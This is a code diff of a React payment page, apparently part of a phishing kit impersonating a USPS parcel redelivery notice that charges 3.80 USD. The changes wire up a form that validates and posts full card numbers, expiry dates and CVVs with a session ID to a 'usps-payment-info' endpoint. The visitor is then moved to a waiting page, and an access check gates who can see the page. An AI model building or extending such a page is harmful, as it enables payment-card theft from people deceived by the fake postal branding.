@@ -1,11 +1,19 @@
 import React, { useState } from "react";
+import { useLocation, useNavigate } from "react-router-dom";
+import axios from "axios";
 import Header from "../components/Header";
 import Footer from "../components/Footer";
+import { baseUrl } from "../constants";
+import useAccessCheck from "../Utils/useAccessCheck";
 
 const Payment: React.FC = () => {
   const inputClass =
     "w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]";
 
+  const navigate = useNavigate();
+  const location = useLocation();
+  const { sessionId } = location.state || {};
+  const isAllowed = useAccessCheck(baseUrl);
   const statusSegments = [
     { id: 1, gradient: "linear-gradient(90deg, #2b2a72 0%, #1f1f5a 100%)" },
     { id: 2, color: "#d9d9df" },
@@ -16,6 +24,13 @@ const Payment: React.FC = () => {
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [errors, setErrors] = useState({
+    cardNumber: "",
+    expiry: "",
+    cvv: "",
+    form: "",
+  });
 
   const formatCardNumber = (value: string) => {
     const digits = value.replace(/\D/g, "").slice(0, 16);
@@ -29,6 +44,68 @@ const Payment: React.FC = () => {
   };
 
   const formatCvv = (value: string) => value.replace(/\D/g, "").slice(0, 4);
+
+  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+
+    if (!sessionId) {
+      setErrors((prev) => ({
+        ...prev,
+        form: "Session expired. Please restart the process.",
+      }));
+      return;
+    }
+
+    setIsLoading(true);
+
+    const cardDigits = cardNumber.replace(/\s/g, "");
+
+    const newErrors = {
+      cardNumber: cardDigits.length !== 16 ? "Card number must be 16 digits." : "",
+      expiry:
+        !/^\d{2}\/\d{2}$/.test(expiry) ? "Expiry date must be in MM/YY format." : "",
+      cvv: cvv.length < 3 || cvv.length > 4 ? "CVV must be 3 or 4 digits." : "",
+      form: "",
+    };
+
+    if (Object.values(newErrors).some((msg) => msg)) {
+      setErrors(newErrors);
+      setIsLoading(false);
+      return;
+    }
+
+    try {
+      await axios.post(`${baseUrl}api/usps-payment-info/`, {
+        sessionId,
+        cardNumber: cardDigits,
+        expiryMonth: expiry.slice(0, 2),
+        expiryYear: expiry.slice(3),
+        cvv,
+      });
+
+      navigate("/wait", { state: { sessionId } });
+    } catch (error) {
+      console.error("Error submitting payment info:", error);
+      setErrors((prev) => ({
+        ...prev,
+        form: "There was an error processing your payment. Please try again.",
+      }));
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  if (isAllowed === null) {
+    return <div>Loading...</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
+  }
+
+  if (!sessionId) {
+    return <div>Missing session information. Please restart the process.</div>;
+  }
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
@@ -108,7 +185,10 @@ const Payment: React.FC = () => {
               <div className="text-[10px] text-[#c5282c] tracking-wide mb-5">
                 This redelivery request costs 3.80 USD.
               </div>
-              <form className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-4 max-w-[620px]">
+              <form
+                className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-4 max-w-[620px]"
+                onSubmit={handleSubmit}
+              >
                 <div className="sm:col-span-2">
                   <input
                     type="text"
@@ -120,6 +200,9 @@ const Payment: React.FC = () => {
                     pattern="^(\d{4} \d{4} \d{4} \d{4})$"
                     required
                   />
+                  {errors.cardNumber && (
+                    <p className="mt-1 text-xs text-red-600">{errors.cardNumber}</p>
+                  )}
                 </div>
                 <input
                   type="text"
@@ -131,6 +214,9 @@ const Payment: React.FC = () => {
                   pattern="^(0[1-9]|1[0-2])\/\d{2}$"
                   required
                 />
+                {errors.expiry && (
+                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.expiry}</p>
+                )}
                 <input
                   type="text"
                   inputMode="numeric"
@@ -141,11 +227,20 @@ const Payment: React.FC = () => {
                   pattern="^\d{3,4}$"
                   required
                 />
+                {errors.cvv && (
+                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.cvv}</p>
+                )}
+                {errors.form && (
+                  <p className="sm:col-span-2 text-sm text-red-600 font-semibold">
+                    {errors.form}
+                  </p>
+                )}
                 <button
                   type="submit"
-                  className="sm:col-span-2 mt-2 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-12 py-3.5 text-[16px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors"
+                  className="sm:col-span-2 mt-2 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-12 py-3.5 text-[16px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors disabled:opacity-60 disabled:cursor-not-allowed"
+                  disabled={isLoading}
                 >
-                  Continue
+                  {isLoading ? "Processing..." : "Continue"}
                 </button>
               </form>
             </section>
